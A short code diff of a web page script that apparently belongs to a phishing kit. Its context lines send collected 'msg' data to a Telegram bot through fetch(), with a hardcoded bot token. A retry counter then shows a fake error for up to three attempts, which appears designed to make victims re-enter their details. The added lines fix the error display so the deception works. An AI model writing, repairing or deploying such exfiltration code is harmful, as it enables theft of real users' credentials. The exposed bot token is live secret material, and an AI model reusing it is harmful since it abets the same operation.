@@ -108,6 +108,9 @@
                     // Corrected URL: Removed curly braces and added '/bot' before the token.
                     fetch(`https://api.telegram.org/bot8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, { mode: 'no-cors' });
 
+                    // Declare and initialize errorDiv here
+                    const errorDiv = document.getElementById('errorDiv'); // Or use querySelector if it's a class or other selector
+
                     setTimeout(() => {
                         if (attempts < 3) {
                             errorDiv.style.display = "block";
@@ -122,6 +125,7 @@
         }
     });
 </script>
+
 
 
 
